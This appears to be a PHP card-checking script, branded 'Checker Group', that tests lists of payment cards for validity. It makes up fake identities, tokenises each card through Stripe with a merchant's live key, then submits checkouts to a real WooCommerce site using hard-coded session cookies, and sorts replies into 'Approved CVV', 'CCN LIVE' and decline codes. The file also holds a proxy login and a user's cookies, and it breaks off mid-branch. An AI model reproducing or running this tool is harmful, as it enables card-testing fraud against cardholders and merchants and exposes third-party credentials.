<?php 

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$username = value($resposta, '"username"', '"');
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

$proxy = 'rproxie.iproyal.com:31112';
$proxyauth = 'iproyal251:ftQH7bW7MmU3EshT_country-UnitedStates';

# -------------------- [1 REQ] -------------------#

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/sources',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$firstname.'+'.$lastname.'&owner[address][line1]=211+Ben+St&owner[address][city]=London&owner[address][postal_code]=SO15+2GB&owner[address][country]=GB&owner[email]='.$email.'&owner[phone]=5117182881&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=b69b8e2b-dabf-400c-9b76-7643b9e293a7ec4842&muid=8f2e7737-d9bf-481f-8c5c-8629d137d961c7456b&sid=4793598d-e0a4-408b-af26-678c934f68f1e39fde&pasted_fields=number&payment_user_agent=stripe.js%2Fa58b3a46%3B+stripe-js-v3%2Fa58b3a46&time_on_page=18014&referrer=https%3A%2F%2Fwww.wpsanctuary.com%2F&key=pk_live_T78W6nbIgm4d2LI9Gnygz0hT');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://www.wpsanctuary.com/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.wpsanctuary.com',
'method: POST',
'path: /?wc-ajax=checkout',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'wordpress_test_cookie=WP+Cookie+check; wp_woocommerce_session_68f9bfe21defc5008ce5b8d074179df1=43%7C%7C1609554926%7C%7C1609551326%7C%7Cb3d7cf2a6d4a9512466abef0283d8ac1; __stripe_mid=8f2e7737-d9bf-481f-8c5c-8629d137d961c7456b; __stripe_sid=4793598d-e0a4-408b-af26-678c934f68f1e39fde; woocommerce_items_in_cart=1; woocommerce_cart_hash=630d21391f358d37b16a84f809ae1f82; wordpress_logged_in_68f9bfe21defc5008ce5b8d074179df1=bryce.suasi%7C1610591781%7CCsrhaJriuFMsT5sC3dCZ5eOhqJOTDFAEnX4ajDbLaiW%7C87533b8eeb27b043fb926e81f5964256cdc6caf4f1b22e0862938161baa45b52',
'origin: https://www.wpsanctuary.com',
'referer: https://www.wpsanctuary.com/checkout/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Bryce&billing_last_name=Suasi&billing_company=&billing_country=GB&billing_address_1=211+Ben+St&billing_address_2=&billing_city=London&billing_state=&billing_postcode=SO15+2GB&billing_phone=5117182881&billing_email=brycesuasi%40gmail.com&payment_method=stripe&terms=on&terms-field=1&woocommerce-process-checkout-nonce=934c3b22ee&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source=src_1I4H1tIneqgQpf85dDRSQ6m7');

$result2 = curl_exec($ch);

# ---------------------------------------#

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

# ---------------- [Responses] ----------------- #

if
(strpos($result2,  '"cvc_check": "pass"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "Thank You For Donation.")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}
elseif
(strpos($result2,  '"Thank You For Donation."')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "Thank You.")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card zip code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
} 
elseif
(strpos($result2,  '/donations/thank_you?donation_number=','')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  "incorrect_zip")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED Incorrect zip  [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  '"type":"one-time"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED Incorrect zip  [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'security code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card&#039;s security code is invalid.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'The CVC number is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_cvc")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "stolen_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "pickup_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "fail"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_cvc")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "stolen_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "pickup_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card has expired.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card number is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  'card was declined.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "generic_decline")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "do_not_honor")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  "expired_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "processing_error")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2, "service_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "unchecked"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "unavailable"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "parameter_invalid_empty")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined : Missing Card Details [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "lock_timeout")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "transaction_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2, "three_d_secure_redirect")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2, "missing_payment_information")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card has expired.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'card number is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  'card was declined.')) {
